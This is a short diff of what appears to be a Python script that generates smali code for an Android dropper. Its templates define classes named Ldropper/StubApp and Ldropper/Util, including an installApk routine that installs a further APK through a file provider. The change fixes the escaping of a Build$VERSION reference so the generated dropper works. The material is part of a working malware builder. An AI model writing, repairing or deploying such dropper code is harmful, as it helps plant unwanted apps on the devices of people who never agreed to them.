@@ -35,7 +35,7 @@ def run_cmd(cmd, timeout=300):
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# --------------- Smali Strings (NO BACKSLASH) ---------------
+# --------------- Smali Strings (FIXED) ---------------
 STUB_APP = """.class public Ldropper/StubApp;
 .super Landroid/app/Application;
 
@@ -151,7 +151,7 @@ STUB_UTIL = """.class public Ldropper/Util;
 
 .method public static installApk(Landroid/content/Context;Ljava/io/File;)V
     .registers 7
-    sget v0, Landroid/os/Build\$VERSION;->SDK_INT:I
+    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
     const/16 v1, 0x18
     if-lt v0, v1, :nougat
     const-string v2, "__PACKAGE__.fileprovider"
